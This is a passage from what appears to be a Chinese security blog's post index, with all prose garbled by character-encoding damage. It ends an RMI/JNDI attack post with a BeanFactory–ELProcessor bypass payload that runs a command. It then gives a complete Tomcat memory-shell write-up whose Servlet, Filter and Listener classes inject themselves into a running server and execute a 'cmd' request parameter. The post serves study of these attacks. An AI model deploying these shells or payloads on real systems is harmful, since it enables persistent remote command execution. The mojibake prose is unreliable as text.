çš„ç±»ä¼šåœ¨RegistryImpl_Stubçš„bindæ–¹æ³•ä¸­ï¼Œåºåˆ—åŒ–ç±»çš„è¾“å‡ºæµConnectionOutputStreamçš„çˆ¶ç±»MarshalOutputStreamçš„enableReplaceå±æ€§æ°¸ä¸ºtrueï¼Œä»£ç†ç±»è¢«æ›¿æ¢ä¸ºUnicastRefé€ æˆåˆ©ç”¨é“¾è¢«ç ´åï¼Œæ‰€ä»¥å®é™…åˆ©ç”¨ä¸­è¦æƒ³åŠæ³•å°†enableReplaceå€¼æ”¹ä¸ºfalseã€‚ysomapä¸­æœ‰å®ç°æ–¹æ³•ï¼Œæ„Ÿå…´è¶£å¯æœ‰çœ‹ä¸€çœ‹ã€‚ trustURLCodebaseç»•è¿‡é™¤äº†ä»¥ä¸Šæ³¨å†Œä¸­å¿ƒJEP290çš„é™åˆ¶ä¹‹å¤–ï¼ŒRMIä¸­æœåŠ¡ç«¯å¯¹å®¢æˆ·ç«¯çš„æ”»å‡»ï¼šJNDIæ³¨å…¥ï¼Œä½¿ç”¨rmiå’Œldapåè®®åŠ è½½å¤–éƒ¨å·¥å‚ç±»ä¹Ÿå…ˆåå—åˆ°trustURLCodebaseçš„é™åˆ¶ï¼Œåªèƒ½ä»æœ¬åœ°å·¥å‚ç±»å®ä¾‹åŒ–å¯¹è±¡ã€‚ æœ¬åœ°å·¥å‚ç±»ç»•è¿‡ä½¿ç”¨æœ¬åœ°å·¥å‚ç±»è¿›è¡ŒJNDIæ³¨å…¥å’ŒRMIåè®®è¿œç¨‹åŠ è½½æ¶æ„ç±»çš„JNDIæ³¨å…¥å¼€å¤´çš„è°ƒç”¨æ ˆåŸºæœ¬ç›¸ä¼¼ï¼Œæ¯•ç«Ÿä¸¤è€…éƒ½æ˜¯åŸºäºRMIåè®®çš„ï¼Œä½†åœ¨javax.naming.spi.NamingManager#getObjectInstanceè¿™é‡Œå¼€å§‹å°±æœ‰æ‰€ä¸åŒã€‚åœ¨è°ƒç”¨getObjectFactoryFromReferenceæ–¹æ³•æ—¶è¿”å›çš„æ˜¯æœ¬åœ°æ­£å¸¸çš„å·¥å‚ç±»ï¼Œè¿™ä¸ªå·¥å‚ç±»æ˜¯ObjectFactoryçš„å®ç°ç±»æˆ–ä»–çš„å­ç±»ï¼Œç„¶åè°ƒç”¨å·¥å‚ç±»çš„getObjectInstanceæ–¹æ³•ã€‚ ç°åœ¨æ¯”è¾ƒé€šç”¨çš„ObjectFactoryå®ç°ç±»æ˜¯BeanFactoryï¼Œä»–çš„getObjectInstanceæ–¹æ³•ä¼šä»ResourceRefå¯¹è±¡çš„classNameå±æ€§è·å–ç±»åå¹¶å®ä¾‹åŒ–ï¼Œç„¶åä»forceStringçš„Stringå¼•ç”¨åœ°å€ä»¥=å·åˆ†å‰²è·å–å‚æ•°åå’Œsetteræ–¹æ³•åï¼Œå¹¶åå°„è·å–è¿™ä¸ªsetterå‚æ•°ä¸ºStringçš„æ–¹æ³•ï¼Œæœ€åè·å–å‚æ•°åçš„Stringå¼•ç”¨åœ°å€å†…å†…å®¹ï¼Œç”¨å®ä¾‹åŒ–çš„å¯¹è±¡è°ƒç”¨è¿™ä¸ªsetteræ–¹æ³•ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?,?&gt; environment) throws NamingException { if (obj instanceof ResourceRef) { try { Reference ref = (Reference) obj; String beanClassName = ref.getClassName(); Class&lt;?&gt; beanClass = null; ClassLoader tcl = Thread.currentThread().getContextClassLoader(); if (tcl != null) { try { beanClass = tcl.loadClass(beanClassName); } catch(ClassNotFoundException e) { } } else { try { beanClass = Class.forName(beanClassName); } catch(ClassNotFoundException e) { e.printStackTrace(); } } if (beanClass == null) { throw new NamingException (\"Class not found: \" + beanClassName); } ... Object bean = beanClass.getConstructor().newInstance(); /* Look for properties with explicitly configured setter */ RefAddr ra = ref.get(\"forceString\"); Map&lt;String, Method&gt; forced = new HashMap&lt;&gt;(); String value; if (ra != null) { value = (String)ra.getContent(); Class&lt;?&gt; paramTypes[] = new Class[1]; paramTypes[0] = String.class; String setterName; int index; /* Items are given as comma separated list */ for (String param: value.split(\",\")) { param = param.trim(); /* A single item can either be of the form name=method * or just a property name (and we will use a standard * setter) */ index = param.indexOf('='); if (index &gt;= 0) { setterName = param.substring(index + 1).trim(); param = param.substring(0, index).trim(); } else { ... } try { forced.put(param, beanClass.getMethod(setterName, paramTypes)); } catch (NoSuchMethodException|SecurityException ex) { ... } } } Enumeration&lt;RefAddr&gt; e = ref.getAll(); while (e.hasMoreElements()) { ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals(\"scope\") || propName.equals(\"auth\") || propName.equals(\"forceString\") || propName.equals(\"singleton\")) { continue; } value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) { valueArray[0] = value; try { method.invoke(bean, valueArray); } catch (...) { ... } continue; } ... } return bean; } catch (java.beans.IntrospectionException ie) { ... } } else { return null; }} ç»“åˆä»¥ä¸ŠgetObjectInstanceä»£ç é€»è¾‘ï¼Œè¢«åå°„çš„ç±»éœ€è¦ç¬¦åˆä»¥ä¸‹æ¡ä»¶æ‰å¯è¢«åˆ©ç”¨: å…·æœ‰ä¸€ä¸ªæ— å‚å…¬æœ‰æ„é€ æ–¹æ³• å…·æœ‰ä¸€ä¸ªå…¬æœ‰ã€å‚æ•°ä¸ºStringç±»å‹çš„æ–¹æ³• ä¸€äº›ä½¿ç”¨äº†tomcat-embed-elä¾èµ–çš„é¡¹ç›®ï¼Œæˆ–è€…éƒ¨åˆ†tomcatå’Œspringçš„ç‰ˆæœ¬ä¸‹å…·æœ‰çš„javax.el.ELProcessorç±»å’Œä»–çš„evalæ–¹æ³•ç¬¦åˆè¿™äº›æ¡ä»¶ï¼Œæœ€ç»ˆæ„é€ å‡ºç”¨äºç»‘å®šçš„Remoteå¯¹è±¡å¦‚ä¸‹ï¼š 1234ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", (String) null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", (String) null);resourceRef.add(new StringRefAddr(\"forceString\", \"a=eval\"));resourceRef.add(new StringRefAddr(\"a\", \"Runtime.getRuntime().exec(\\\"calc\\\")\"));ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); å‚è€ƒhttps://mp.weixin.qq.com/s/AG0OfLfQWW-winIWiOtwLQ https://su18.org/post/rmi-attack/ http://pipinstall.cn/2021/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ https://xz.aliyun.com/t/7932 https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1 https://www.anquanke.com/post/id/263726 https://tttang.com/archive/1405/ https://mp.weixin.qq.com/s/gBuKDjRfnbJDv6TG5F6q3w","link":"/2022/02/16/Java_RMIæ”»å‡»åˆ†æä¸æ€»ç»“/"},{"title":"Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ ","text":"å‰è¨€å†…å­˜é©¬ä¹‹å‰æœ‰æ¥è§¦è¿‡ï¼Œåœ¨é˜¿é‡ŒSRCçš„å®™æ–¯æ´»åŠ¨ä¸­è–…äº†ç‚¹ç¾Šæ¯›ï¼Œä½†å½“æ—¶åªæ˜¯ä¼šç”¨ï¼Œä¸äº†è§£ä»–çš„åŸç†ã€‚æœ¬æ–‡é€šè¿‡è°ƒè¯•çš„æ–¹æ³•äº†è§£å†…å­˜é©¬çš„åŸç†ï¼Œå¹¶å®ç°å¸¸è§çš„å‡ ç§å†…å­˜é©¬ã€‚ å‰ç½®çŸ¥è¯†Java Webä¸‰å¤§ç»„ä»¶ServletServletæ˜¯Server Appletçš„ç¼©å†™ï¼Œå³æœåŠ¡ç«¯å°ç¨‹åºï¼Œå¯ä»¥æ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ï¼Œå¹¶å°†å“åº”æ•°æ®å‘é€å›å®¢æˆ·ç«¯ã€‚Servletæ˜¯Java Webä¸­æœ€å¸¸ç”¨çš„ä¸€ç§ç»„ä»¶ï¼Œå°±ç®—åªç”¨åˆ°äº†jspæˆ–jspxå¼€å§‹ï¼Œå®é™…ä¸Šä¹Ÿç”¨åˆ°äº†Servletï¼Œå› ä¸ºjspå’Œjspxæœ¬è´¨ä¸Šæ˜¯HttpServletï¼Œè€ŒHttpServletåˆæ˜¯Servletçš„å­ç±»ã€‚ FilterFilterå¯ä»¥åœ¨è¯·æ±‚åˆ°è¾¾Servletã€å“åº”åˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œå¯¹è¯·æ±‚æˆ–å“åº”åšå¤„ç†ï¼Œå› æ­¤Listenerå¸¸è¢«ç”¨æ¥å®ç°è¿‡æ»¤æˆ–è®¿é—®æ§åˆ¶ç­‰ã€‚ ListenerListeneræ˜¯ç”¨æ¥ç›‘å¬æŸä¸€äº‹ä»¶çš„ï¼Œå…·ä½“å¯å®ç°ç»Ÿè®¡åœ¨çº¿ç”¨æˆ·æ•°ã€è®¿é—®ç»Ÿè®¡ç­‰ã€‚Listenerçš„ç§ç±»å¾ˆå¤šï¼Œæœ‰ServletContextAttributeListenerã€ServletRequestAttributeListenerã€ServletRequestListenerã€HttpSessionIdListenerå’ŒHttpSessionAttributeListenerã€‚å…¶ä¸­ServletRequestListeneræ˜¯ç”¨æ¥ç›‘å¬è¯·æ±‚çš„ï¼Œå¾ˆé€‚åˆå®ç°å†…å­˜é©¬ã€‚ ä¸¤ç§ä¸Šä¸‹æ–‡ä¸å†…å­˜é©¬ç›¸å…³çš„ä¸¤ç§ä¸Šä¸‹æ–‡æ˜¯ApplicationContextå’ŒStandardContextã€‚ApplicationContextæ˜¯å®ç°ServletContextçš„ç±»ï¼Œè®°å½•çš„æ˜¯Servletçš„ä¸€äº›ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œè€ŒStandardContextè®°å½•çš„æ˜¯åŒ…æ‹¬web.xmlåœ¨å†…çš„ä¸€äº›Webåº”ç”¨ä¿¡æ¯ã€‚ è‡³äºä»€ä¹ˆæ˜¯Contextï¼Œä¸ªäººç†è§£æ˜¯ä¸å®ƒçš„ä¸­æ–‡æ„æ€ä¸€æ ·ï¼Œä¸Šä¸‹æ–‡æˆ–è¯­å¢ƒï¼Œæ˜¯ä¸€ç§å°èŒƒå›´çš„ç¯å¢ƒå˜é‡ï¼Œå½“ç„¶ä¹Ÿå› ä¸ºæ˜¯ä¸€ä¸ªç±»ï¼Œæœ‰ç›¸åº”çš„æœ‰æ–¹æ³•æ“ä½œè¿™äº›ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚ Contextçš„è·å–ä¹Ÿéœ€è¦æä¸€æï¼Œå› ä¸ºæ˜¯åç»­å†…å­˜é©¬çš„åŠ è½½ä¾èµ–äºStandardContextï¼Œæ˜¯å†…å­˜é©¬çš„å…³é”®ã€‚å…¶ä¸­å¸¸ç”¨çš„ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡HttpServletRequestå¯¹è±¡çš„getServletContextæ–¹æ³•è·å–ServletContextå¯¹è±¡ï¼Œå®é™…ä¸Šæ˜¯å°è£…äº†ApplicationContentçš„ApplicationContextFacadeï¼Œè€ŒApplicationContextåˆæ˜¯tomcatä¸­æ—¶å®ç°ServletContextæ¥å£çš„ç±»ï¼Œç„¶åå…¶ä¸­æœ‰contextå±æ€§ï¼Œå­˜å‚¨ç€StandardContextå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡åå°„è·å–ã€‚ å¦‚æœæ²¡æœ‰requestçš„è¯ï¼Œè¿˜å¯ä»¥ä»çº¿ç¨‹ä¸­è·å–ï¼Œè¯¦ç»†åˆ†æå¯ä»¥çœ‹é•¿äº­ä¸€ä½å¸ˆå‚…çš„æ–‡ç« ï¼šTomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä»MBeanä¸­è·å–ï¼Œä½†ç›¸å¯¹å¤æ‚ä¸€äº›ã€‚ web.xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹è°ƒè¯•å¤§å¤šæ•°å¸ˆå‚…çš„å†…å­˜é©¬åˆ†ææ–‡ç« éƒ½æ˜¯ä»ApplicationContextçš„addServletã€addFilterå’ŒaddListeneræ–¹æ³•äº†è§£Java Webä¸‰å¤§ç»„ä»¶çš„åŠ è½½åŸç†çš„ï¼Œä½†æœ¬æ–‡ä»web.xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹çš„è§’åº¦åˆ†æå†…å­˜é©¬åŸç†ï¼Œä¸è¿‡å®è´¨ä¸Šéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæœ€ç»ˆä¿®æ”¹StandardCotextçš„å†…å®¹å®ç°çš„ã€‚ æ—¢ç„¶æ˜¯è°ƒè¯•ï¼Œè¦å…ˆåšäº›å‡†å¤‡å·¥ä½œï¼Œåœ¨IDEAä¸­æ–°å»ºä¸€ä¸ªJava Webé¡¹ç›®åï¼Œè¿˜éœ€åœ¨mavenä¸­æ·»åŠ ä¸ªtomcat-embed-coreçš„ä¾èµ–å¦‚ä¸‹ï¼Œç‰ˆæœ¬åˆ™è®¾ç½®ä¸æœ¬åœ°tomcatç‰ˆæœ¬ç›¸åŒï¼Œæ–¹ä¾¿ä¸‹æ–­ç‚¹å’Œè°ƒè¯•ã€‚ 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt; &lt;version&gt;8.5.71&lt;/version&gt;&lt;/dependency&gt; ç”±äºå¯¹tomcatçš„æºç æ²¡æœ‰ç ”ç©¶ï¼Œæ‰€ä»¥çœŸä¸çŸ¥é“æ®µç‚¹åº”è¯¥åœ¨å“ªé‡Œä¸‹ï¼Œå¥½åœ¨åœ¨ç½‘ä¸Šæ‰¾åˆ°ç¯‡æ–‡ç« å«Tomcatåº”ç”¨ web.xmlçš„åŠ è½½è¿‡ç¨‹ã€‚æ–‡ä¸­æåˆ°web.xmlçš„åŠ è½½åˆ°StandardContextç”±org.apache.catalina.startup.ContextConfigç±»çš„configureContextæ–¹æ³•å®ç°ã€‚ æ­¤æ—¶åœ¨web.xmlä¸­é…ç½®ä¸‰å¤§ç»„ä»¶å¦‚ä¸‹ï¼Œå¹¶åœ¨configureContextæ–¹æ³•å¤„ä¸‹æ®µç‚¹å³å¯å¼€å§‹è°ƒè¯•ã€‚ 123456789101112131415161718192021&lt;servlet&gt; &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt; &lt;servlet-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ServletDemo&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt; &lt;url-pattern&gt;/p1ay2win&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;filter&gt; &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt; &lt;filter-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.FilterDemo&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;listener&gt; &lt;listener-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ListenerDemo&lt;/listener-class&gt;&lt;/listener&gt; ä½¿ç”¨webxmlå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯web.xmlè§£æåçš„å†…å®¹ï¼Œè°ƒç”¨çš„æ–¹æ³•åå¯å¾—çŸ¥ï¼ŒconfigureContextæ–¹æ³•å…ˆåä½¿ç”¨å±æ€§contextï¼Œä¹Ÿå°±æ˜¯StandardContextçš„å®ä¾‹ï¼Œæ·»åŠ Fiterã€Listenerå’ŒServletã€‚ 123456789101112for (ServletDef servlet : webxml.getServlets().values()) { Wrapper wrapper = context.createWrapper(); ... wrapper.setName(servlet.getServletName()); ... wrapper.setServletClass(servlet.getServletClass()); ... context.addChild(wrapper);}for (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) { context.addServletMappingDecoded(entry.getKey(), entry.getValue());} å…ˆè¯´è¯´ServletåŠ è½½çš„æµç¨‹ï¼ŒStandardContextå®ä¾‹æ–°å»ºä¸€ä¸ªWrapperï¼Œç„¶åå°è£…è¿›Servletåå’ŒServletç±»åçš„ä¿¡æ¯ï¼Œåœ¨åŠ å…¥ä¸ºStandardContextçš„å­å®¹å™¨ï¼Œè¿™é‡Œå¯¹äºçš„æ˜¯web.xmlä¸­çš„&lt;servlet&gt;ï¼›æ¥ç€è·å–ServletMappingä¿¡æ¯ï¼ŒåŠ å…¥åˆ°StandardContextçš„ServletMappingä¸­ï¼Œå¯¹åº”çš„æ˜¯&lt;servlet-mapping&gt;ã€‚ åœ¨Filterçš„åŠ è½½æµç¨‹ä¸­ï¼Œå…ˆåå°†FilterDefå’ŒFilterMapåŠ å…¥åˆ°StandardContextå®ä¾‹ä¸­ï¼Œå¯¹åº”çš„æ˜¯&lt;filter&gt;å’Œ&lt;filter-mapping&gt;ã€‚ åœ¨Listenerçš„åŠ è½½æµç¨‹ä¸­ï¼Œåªéœ€å°†filterååŠ å…¥åˆ°StandardContextå®ä¾‹çš„applicationListenerä¸­ã€‚ æŒ‰ç…§ä¸Šè¿°æµç¨‹ï¼Œå†™ä¸€ä¸ªServletçš„å†…å­˜é©¬æ˜¯æ­£å¸¸çš„ï¼Œè€ŒFilterå’ŒListenerå°±æ²¡æœ‰ç”Ÿæ•ˆï¼Œä¸ApplicationContextçš„addFilterå’ŒaddListeneræ–¹æ³•å’Œæ­£å¸¸åŠ è½½web.xmlçš„StandardContextå®ä¾‹å¯¹æ¯”ï¼ŒStandardContextå®ä¾‹æ­£å¸¸æƒ…å†µä¸‹Filterè¿˜è®¾ç½®äº†çš„filterConfigï¼Œè€ŒListenerè¿˜è®¾ç½®äº†applicationEventListenerã€‚ å¯¹è¿™ä¸¤ä¸ªå±æ€§ä¸‹æ–­ç‚¹ï¼ŒåŠ è½½äº†web.xmlé…ç½®åï¼ŒStandardContextå®ä¾‹è¿˜åˆ†åˆ«è°ƒç”¨listenerStartå’ŒfilterStartæ–¹æ³•ï¼Œè®¾ç½®äº†ä¸Šè¿°ä¸¤ä¸ªå±æ€§ï¼Œæ‰€ä»¥å†…å­˜é©¬æœ€ç»ˆä¹Ÿéœ€è¦è°ƒç”¨listenerStartå’ŒfilterStartæ–¹æ³•æ‰å®ŒæˆListenerå’ŒFilterçš„åŠ è½½ã€‚ å†è¯´ä¸€ä¸ªå°è¯•å†™å†…å­˜é©¬æ—¶å€™é‡åˆ°çš„å‘ï¼Œä¸€å¼€å§‹ä¹Ÿåƒç½‘ä¸Šå¤§å¤šæ•°çš„ä¾‹å­ä¸€æ ·åœ¨æ–¹æ³•é‡Œå®ç°Servletã€Filterå’ŒListeneræ¥å£ï¼Œå¹¶å®ä¾‹åŒ–ï¼›ç„¶åå®Œå…¨æŒ‰ç…§tomcatå¯åŠ¨æµç¨‹åŠ è½½è¿™ä¸‰ä¸ªç»„ä»¶çš„æ—¶å€™æ²¡æ•ˆæœï¼Œåœ¨ä¸€ä¸ªæŠ¥é”™é¡µé¢ä¸­çœ‹åˆ°æ— æ³•å®ä¾‹åŒ–çš„å¼‚å¸¸ï¼Œåœ¨StandardContextå®ä¾‹ç¡®å®ä¹Ÿæ²¡çœ‹åˆ°è¿™ä¸‰ä¸ªç»„ä»¶çš„å®ä¾‹ã€‚äºæ˜¯ä»StandardContextçš„stratInternalæ–¹æ³•ä¸€æ­¥ä¸€æ­¥è°ƒï¼Œå‘ç°ä¼šä½¿ç”¨ä¼ å…¥çš„ä¸‰ä¸ªç»„ä»¶çš„ç±»åè¿›è¡Œå®ä¾‹åŒ–ï¼Œç”±äºæ˜¯åœ¨æ–¹æ³•é‡Œå®ç°çš„ä¸‰ä¸ªç»„ä»¶çš„æ¥å£ç±»ï¼Œè¿™ä¸‰ä¸ªç»„ä»¶çš„ç±»å±äºæ˜¯å†…éƒ¨ç±»ï¼Œæ‰€ä»¥æ™®é€šçš„åå°„æ²¡æ³•å®ä¾‹åŒ–è¿™ä¸‰ä¸ªç±»ï¼Œå¯¼è‡´è¿™ä¸‰ä¸ªç»„ä»¶æ²¡æ³•æ­£å¸¸åŠ è½½ã€‚ å°ç»“æ­¤å¤„å°ç»“æ€»ç»“ä¸‹ä¸‰ä¸ªä¸»é”®çš„åŠ è½½æ¡ä»¶ Servlet Wrapperå°è£…Servletçš„ä¿¡æ¯ åŠ å…¥Wrapperåˆ°StandardContextçš„childrenä¸­ Filter åŠ å…¥åˆ°StandardContextçš„filterDefs åŠ å…¥åˆ°StandardContextçš„filterMaps åŠ å…¥åˆ°StandardContextçš„filterConfigs Listener åŠ å…¥Listenerå¯¹è±¡åˆ°StandardContextçš„applicationEventListenerä¸­ ä¸‰ç§å†…å­˜é©¬å®ç°è¿™é‡Œç›´æ¥è´´ä»£ç äº† Servlet 12345678910111213141516171819202122232425262728293031package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.Wrapper;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class ServletDemo extends HttpServlet { public ServletDemo() { WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (standardContext.findServletMapping(\"/p1ay2win\") == null) { Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"p1ay2win\"); wrapper.setServletClass(this.getClass().getName()); standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(\"/p1ay2win\", \"p1ay2win\"); } } @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Runtime.getRuntime().exec(\"cmd /c\" + request.getParameter(\"cmd\")); }} Filter 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import javax.servlet.*;import java.io.IOException;public class FilterDemo implements Filter { public FilterDemo() { WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (standardContext.findFilterDef(\"p1ay2win\") == null) { FilterDef filterDef = new FilterDef(); filterDef.setFilterName(\"p1ay2win\"); filterDef.setFilterClass(this.getClass().getName()); standardContext.addFilterDef(filterDef); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\"p1ay2win\"); filterMap.addURLPattern(\"/*\"); standardContext.addFilterMap(filterMap); standardContext.filterStart(); } } @Override public void init(FilterConfig filterConfig) { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { Runtime.getRuntime().exec(\"cmd /c \" + servletRequest.getParameter(\"cmd\")); filterChain.doFilter(servletRequest, servletResponse); } @Override public void destroy() { }} Listener 1234567891011121314151617181920212223242526272829303132333435package com.p1ay2win.JavaWebMemoryShell.exploit;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import java.io.IOException;import java.util.Arrays;public class ListenerDemo implements ServletRequestListener { public ListenerDemo() { WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); if (!Arrays.asList(standardContext.findApplicationListeners()).contains(this.getClass().getName())) { standardContext.addApplicationListener(this.getClass().getName()); standardContext.listenerStart(); } } @Override public void requestInitialized(ServletRequestEvent sre) { try { if (sre.getServletRequest().getParameter(\"cmd\") != null) Runtime.getRuntime().exec(sre.getServletRequest().getParameter(\"cmd\")); } catch (IOException e) { e.printStackTrace(); } } @Override public void requestDestroyed(ServletRequestEvent sre) { }} å†…å­˜é©¬é™¤äº†ä½¿ç”¨StandardContextè‡ªå¸¦çš„æ–¹æ³•åŠ è½½ï¼Œè¿˜å¯ä½¿ç”¨ApplicationContextçš„addServltã€addFilterå’ŒaddListeneræ–¹æ³•åŠ è½½ï¼Œä½†ä¹‹æ‰€ä»¥å¾ˆå°‘äººä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œæ˜¯å› ä¸ºaddXXXæ–¹æ³•éƒ½æœ‰ä¸‹é¢è¿™æ®µä»£ç ï¼Œæ£€æµ‹è¿è¡ŒçŠ¶æ€ï¼Œä¸å…è®¸åˆå§‹åŒ–ååœ¨æ·»åŠ ç»„ä»¶ã€‚ 12345if (!context.getState().equals(LifecycleState.STARTING_PREP)) { throw new IllegalStateException( sm.getString(\"applicationContext.addXXX.ise\", getContextPath()));} æ—¢ç„¶æ˜¯å±æ€§ï¼Œè‚¯å®šæ˜¯èƒ½å¤Ÿé€šè¿‡åå°„çš„æ–¹æ³•ä¿®æ”¹å®ƒçš„å€¼ï¼Œç„¶åç»•è¿‡æ£€æµ‹çš„ï¼Œä½†æœ¬æ–‡å› ä¸ºç¯‡å¹…é—®é¢˜å°±ä¸ç»™å‡ºå®ç°ä»£ç äº†ï¼Œä¹Ÿå› ä¸ºæŒºç®€å•çš„ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è¯•è¯•ã€‚ åè®°è¿™é‡Œæ’ä¸ªé¢˜å¤–è¯ï¼Œè·Ÿä¸€ä¸ªå®‰å…¨ç ”ç©¶çš„å¸ˆå…„èŠå¤©çš„æ—¶å€™èŠåˆ°äº†å†…å­˜é©¬ï¼Œæˆ‘å‘ä»–è¯·æ•™è¯´ä¸ºä»€ä¹ˆè¯´æ˜¯å†…å­˜é©¬ï¼Œä½†Catalinaç›®å½•ä¸‹ä¼šç”Ÿæˆå†…å­˜é©¬çš„.classå’Œ.javaæ–‡ä»¶ï¼Œä¸æ˜¯æ— æ–‡ä»¶è½åœ°å—ï¼Ÿè¿˜è·Ÿä»–æ¢è®¨äº†ä¸€é˜µå­ã€‚åæ¥ä»–æ„è¯†åˆ°æˆ‘æ˜¯é€šè¿‡è®¿é—®ä¸Šä¼ çš„jspç”Ÿæˆçš„å†…å­˜é©¬ï¼Œè€Œè®¿é—®jspæ–‡ä»¶æ—¶tomcatçš„æœºåˆ¶æ˜¯å…ˆä»Catalinaç›®å½•ä¸‹æ‰¾æ˜¯å¦å­˜åœ¨è¿™ä¸ªç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¼šæ ¹æ®jspæ–‡ä»¶ç”ŸæˆHttpServletç±»å¹¶ç¼–è¯‘ï¼Œæ”¾åˆ°Catalinaç›®å½•ä¸‹ï¼Œæ‰€ä»¥åˆ é™¤ä¸Šä¼ çš„jspæ–‡ä»¶ï¼ŒCatalinaç›®å½•ä¸‹ç›¸åº”çš„å†…å®¹ä¹Ÿä¼šè¢«åˆ é™¤ï¼Œä½†çœŸæ­£æ„ä¹‰ä¸Šçš„æ— æ–‡ä»¶è¿˜æ˜¯é€šè¿‡ååºåˆ—åŒ–å®ç°ã€‚æƒ³æƒ³é—¹è¿™å‡ºç¬‘è¯ä¹Ÿæ˜¯6æœˆä»½çš„æ—¶å€™äº†ï¼Œæ„Ÿæ…¨æ—¶é—´è¿‡å¾—å¥½å¿«ã€‚ğŸ˜” åŸæœ¬æ‰“ç®—åœ¨æ–‡ä¸­ä¹ŸåŠ ä¸ŠSpringå†…å­˜é©¬çš„å†…å®¹ï¼Œå¥ˆä½•Springçš„å¯åŠ¨æµç¨‹æ¯”Tomcatå¤æ‚å¤ªå¤šï¼ŒTomcatçš„è°ƒè¯•ä¹Ÿæå¾—æˆ‘å¤Ÿå‘›çš„äº†ï¼ŒSpringçš„å†…å®¹è¿˜æ˜¯ç•™åœ¨åç»­å†ç ”ç©¶å§ã€‚é€šè¿‡è¿™æ¬¡å­¦ä¹ ï¼Œæ„Ÿè§‰Javaå®‰å…¨è·Ÿä»£ç çš„ç›¸å…³æ€§å¾ˆå¼ºã€‚åŠ æ²¹å§ï¼Œéªšå¹´ å‚è€ƒhttps://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89 https://www.freebuf.com/articles/web/274466.html https://su18.org/post/memory-shell/ https://github.com/bitterzzZZ/MemoryShellLearn https://landgrey.me/blog/12/ https://www.freebuf.com/articles/web/274466.html https://www.cnblogs.com/colin-xun/p/10573504.html https://blog.csdn.net/lblblblblzdx/article/details/80946526","link":"/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /"},{"title":"Katana 